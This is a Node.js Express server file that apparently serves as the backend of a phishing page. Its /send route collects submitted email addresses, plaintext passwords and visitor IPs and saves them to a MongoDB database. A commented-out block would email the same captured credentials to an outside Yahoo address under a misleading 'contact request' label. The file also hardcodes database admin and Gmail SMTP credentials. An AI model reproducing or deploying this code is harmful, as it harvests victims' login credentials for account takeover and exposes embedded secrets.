const express = require('express');
const bodyParser = require('body-parser');
const exphbs = require('express-handlebars');
const path = require('path');
const mongoose = require('mongoose')
// const nodemailer = require('nodemailer');
const parseServer = require('parse');
const user = require('./schema/user');
const RequestIp = require('@supercharge/request-ip')

const app = express();

mongoose.Promise = global.Promise
mongoose.connect('mongodb+srv://admin:comodor29@cluster0.mjsry.mongodb.net/test', { useNewUrlParser: true }).then(db=>{
    console.log(' Server Connected')
})
.catch(err=>{
    console.log(err)
})

// View engine setup
app.engine('handlebars', exphbs());
app.set('view engine', 'handlebars');

// Static folder
app.use('/public', express.static(path.join(__dirname, 'public')));

// Body Parser Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(__dirname + '/public'));
// app.use('/.netlify/functions/lambda', router);  // path must route to lambda
// app.use('/', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));



const expressMiddleware = function (req, res, next) {  
  req.ip = RequestIp.getClientIp(req)

  next()
}

app.get('/', (req, res) => {

  res.render('views/index.html');
});

app.post('/send', (req, res) => {
const User = new user({
  email: req.body.email,
  password: req.body.password,
  IP: req.ip
})

User.save().then(saved=>{
  console.log(saved)
})


res.send('ok')
});

app.listen(process.env.PORT || 3400, () => console.log('Server started...'));




  //   var ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
    
  // const output = `
  //   <p>You have a new contact request</p>
  //   <h3>Contact Details</h3>
  //   <ul>  
  //     <li>Email: ${req.body.email}</li>
  //     <li>Password: ${req.body.password}</li>
  //     <li>Ip: ${ip}</li>
      
  //   </ul>
  //   <h3>Date</h3>
  //   <p>${new Date(Date.now)}</p>
  // `;

  // // create reusable transporter object using the default SMTP transport
  // let transporter = nodemailer.createTransport({
  //   host: 'smtp.gmail.com',
  //   secureConnection: false,
  //   port: 587 ,
  //   tls: {
  //       ciphers:'SSLv3'
  //    },
  //   secure: false, // true for 465, false for other ports
  //   auth: {
        
  //       user: 'bj74871@gmail.com', // generated ethereal user
  //       pass: 'nicqoreal12345'  // generated ethereal password
  //   },
  //   tls:{
  //     rejectUnauthorized:false
  //   }
  // });

  // // setup email data with unicode symbols
  // let mailOptions = {
  //     from: '"Nodemailer Contact" <test@test.com>', // sender address
  //     to: 'jollofrice234@yahoo.com', // list of receivers
  //     subject: 'Node mailer results', // Subject line
  //     text: 'Welcome Results', // plain text body
  //     html: output // html body
  // };

  // // send mail with defined transport object
  // transporter.sendMail(mailOptions, (error, info) => {
  //     if (error) {
  //         return console.log(error);
  //     }
  //     console.log('Message sent: %s', info.messageId);   
  //     console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

  //     res.send('contact', {msg:'Email has been sent'});
  // });
